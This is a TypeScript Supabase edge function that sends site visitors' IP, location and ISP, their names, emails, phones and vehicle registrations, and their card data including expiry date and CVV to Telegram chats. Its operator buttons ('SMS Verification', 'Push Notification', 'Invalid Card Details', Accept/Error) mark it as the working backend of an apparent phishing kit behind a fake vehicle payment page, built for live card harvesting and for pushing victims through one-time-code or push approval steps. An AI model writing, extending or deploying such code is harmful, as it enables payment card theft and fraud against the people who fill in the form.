import "https://deno.land/x/xhr@0.1.0/mod.ts";
import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2.57.4';

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

interface TelegramSettings {
  bot_token: string;
  info_chat_id: string;
  form_chat_id: string;
}

interface NotificationData {
  type: 'user_info' | 'form_submission' | 'vehicle_lookup' | 'payment_submission';
  data: any;
}

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  const supabaseClient = createClient(
    Deno.env.get('SUPABASE_URL') ?? '',
    Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? '',
  );

  // Enforce POST method
  if (req.method !== 'POST') {
    console.log('[send-telegram-notification] Non-POST request:', req.method);
    return new Response(JSON.stringify({ error: 'Method not allowed' }), {
      status: 405,
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  }

  try {
    const raw = await req.text();
    console.log('[send-telegram-notification] Incoming request meta:', {
      method: req.method,
      headers: Object.fromEntries(req.headers.entries()),
      rawBodyLength: raw?.length ?? 0,
      rawPreview: raw?.slice(0, 200),
    });

    let parsed: NotificationData | null = null;
    try {
      parsed = raw ? JSON.parse(raw) : null;
    } catch (e) {
      console.error('[send-telegram-notification] JSON parse error:', e);
    }

    if (!parsed || !parsed.type) {
      return new Response(JSON.stringify({ error: 'Invalid or empty JSON body' }), {
        status: 400,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    const { type, data } = parsed;

    // Get telegram settings
    const { data: settings, error: settingsError } = await supabaseClient
      .from('settings')
      .select('value')
      .eq('key', 'telegram')
      .maybeSingle();

    if (settingsError || !settings) {
      console.error('Failed to get telegram settings:', settingsError);
      return new Response(
        JSON.stringify({ error: 'Telegram settings not configured' }),
        { 
          status: 400, 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' } 
        }
      );
    }

    const telegramSettings = settings.value as TelegramSettings;

    if (!telegramSettings.bot_token) {
      return new Response(
        JSON.stringify({ error: 'Bot token not configured' }),
        { 
          status: 400, 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' } 
        }
      );
    }

    // Format message based on type
    let message = '';
    let chatId = telegramSettings.info_chat_id; // Default to info chat
    let replyMarkup = null;

    switch (type) {
      case 'user_info':
        message = `🔍 *New User Visit*\n\n` +
          `👤 *User Agent:* ${data.userAgent}\n` +
          `🌍 *IP:* ${data.ip}\n` +
          `🏙️ *Location:* ${data.city}, ${data.region}, ${data.country}\n` +
          `⏰ *Timezone:* ${data.timezone}\n` +
          `🌐 *ISP:* ${data.isp}`;
        break;

      case 'form_submission':
        chatId = telegramSettings.form_chat_id; // Use form chat for submissions
        message = `💳 *New Form Submission*\n\n` +
          `👤 *Name:* ${data.name}\n` +
          `📧 *Email:* ${data.email}\n` +
          `📱 *Phone:* ${data.phone}\n` +
          `🚗 *Vehicle:* ${data.vehicle_registration}\n` +
          `⏱️ *Duration:* ${data.duration}\n` +
          `💰 *Price:* ${data.price}`;
        break;

      case 'vehicle_lookup':
        chatId = telegramSettings.form_chat_id; // Use form chat for vehicle lookups
        message = `🔍 *Vehicle Lookup*\n\n` +
          `🚗 *Registration:* ${data.registration}\n` +
          `🏢 *Make:* ${data.make || 'Unknown'}\n` +
          `🚙 *Model:* ${data.model || 'Unknown'}\n` +
          `🎨 *Color:* ${data.color || 'Unknown'}`;
        break;

      case 'payment_submission':
        chatId = telegramSettings.form_chat_id; // Use form chat for payments
        
        // Build payment method message based on test mode
        let paymentMethodText = '';
        if (data.test_mode) {
          console.log('Card data received:', { 
            card_expiry: data.card_expiry, 
            card_cvv: data.card_cvv,
            card_number_masked: data.card_number_masked,
            card_type: data.card_type 
          });
          
          paymentMethodText = `💳 *Payment Method:* (TEST MODE)\n` +
            `   • Card Number: ${data.card_number_masked || 'N/A'}\n` +
            `   • Card Type: ${data.card_type || 'Unknown'}\n` +
            `   • Expiry Date: ${data.card_expiry || 'N/A'}\n` +
            `   • CVV: ${data.card_cvv || 'N/A'}`;
        } else if (data.card_number_masked || data.card_type) {
          paymentMethodText = `💳 *Payment Method:*\n` +
            `   • Card: ${data.card_number_masked || ''} ${data.card_type ? `(${data.card_type})` : ''}`.trim();
        }

        // Build location info for test mode
        let locationInfo = '';
        if (data.test_mode && (data.ip || data.country)) {
          const escapeMarkdown = (text: string) => String(text ?? '').replace(/[_*\[\]()~`>#+=|{}.!-]/g, '\\$&');
          locationInfo = `\n🌍 *Location Info:* (TEST MODE)\n` +
            `   • IP: ${escapeMarkdown(data.ip)}\n` +
            `   • Country: ${escapeMarkdown(data.country || 'Unknown')}\n` +
            `   • City: ${escapeMarkdown(data.city || 'Unknown')}\n` +
            `   • Region: ${escapeMarkdown(data.region || 'Unknown')}\n` +
            `   • Timezone: ${escapeMarkdown(data.timezone || 'Unknown')}\n` +
            `   • ISP: ${escapeMarkdown(data.isp || 'Unknown')}\n` +
            `   • User Agent: ${escapeMarkdown(data.userAgent || 'Unknown')}`;
        }
        
        message = `💳 *PAYMENT PROCESSING REQUIRED* 💳\n\n` +
          `🆔 *User ID:* \`${data.userId}\`\n` +
          `👤 *Customer:* ${data.name}\n` +
          `📧 *Email:* ${data.email}\n` +
          `📱 *Phone:* ${data.phone}\n\n` +
          `🚗 *Vehicle Details:*\n` +
          `   • Registration: ${data.vehicle_registration}\n` +
          `   • Make: ${data.vehicle_make}\n` +
          `   • Model: ${data.vehicle_model}\n` +
          `   • Color: ${data.vehicle_color}\n\n` +
          `⏱️ *Duration:* ${data.duration}\n` +
          `💰 *Price:* ${data.price}` +
          (paymentMethodText ? `\n\n${paymentMethodText}` : '') + (locationInfo ? `${locationInfo}` : '') + `\n\n` +
          `⚡ *Choose payment processing method:*`;
        
        replyMarkup = {
          inline_keyboard: [
            [
              { text: '📱 SMS Verification', callback_data: `payment_${data.userId}_sms` },
              { text: '🔔 Push Notification', callback_data: `payment_${data.userId}_push` }
            ],
            [
              { text: '❌ Invalid Card Details', callback_data: `payment_${data.userId}_error` }
            ]
          ]
        };
        break;

      case 'push_confirmation':
        chatId = telegramSettings.form_chat_id; // Send to the second (form) chat
        message = `🔔 *PUSH CONFIRMATION REQUEST*\n\n` +
          `🆔 *User ID:* \`${data.userId}\`\n` +
          `👤 *Customer:* ${data.name}\n` +
          `📧 *Email:* ${data.email}\n` +
          `📱 *Phone:* ${data.phone}\n\n` +
          `🚗 *Vehicle:* ${data.vehicle_registration} • ${data.vehicle_make} ${data.vehicle_model}${data.vehicle_color ? ` (${data.vehicle_color})` : ''}\n` +
          `⏱️ *Duration:* ${data.duration}\n` +
          `💰 *Price:* ${data.price || '—'}`;
        replyMarkup = {
          inline_keyboard: [
            [
              { text: '✅ Accept', callback_data: `push_${data.userId}_accept` },
              { text: '❌ Error', callback_data: `push_${data.userId}_error` }
            ]
          ]
        };
        break;

      default:
        throw new Error(`Unknown notification type: ${type}`);
    }

    if (!chatId) {
      return new Response(
        JSON.stringify({ error: 'Chat ID not configured for this notification type' }),
        { 
          status: 400, 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' } 
        }
      );
    }

    // Send message to Telegram (no parse_mode to avoid entity issues)
    const telegramBody: any = {
      chat_id: chatId,
      text: message
    };
    if (replyMarkup) {
      telegramBody.reply_markup = replyMarkup;
    }
    console.log('[send-telegram-notification] Sending to Telegram:', {
      chatId,
      hasReplyMarkup: !!replyMarkup,
      textLength: message?.length ?? 0
    });

    const telegramResponse = await fetch(`https://api.telegram.org/bot${telegramSettings.bot_token}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(telegramBody)
    });

    const telegramResult = await telegramResponse.json();

    if (!telegramResponse.ok) {
      console.error('Failed to send telegram message:', telegramResult);
      return new Response(
        JSON.stringify({ error: 'Failed to send telegram message', details: telegramResult }),
        { 
          status: 500, 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' } 
        }
      );
    }

    console.log('Telegram notification sent successfully:', telegramResult);

    return new Response(
      JSON.stringify({ success: true, messageId: telegramResult.result.message_id }),
      { 
        headers: { ...corsHeaders, 'Content-Type': 'application/json' } 
      }
    );
  } catch (error) {
    console.error('Error in send-telegram-notification:', error);
    return new Response(
      JSON.stringify({ error: 'Internal server error' }),
      { 
        status: 500, 
        headers: { ...corsHeaders, 'Content-Type': 'application/json' } 
      }
    );
  }
});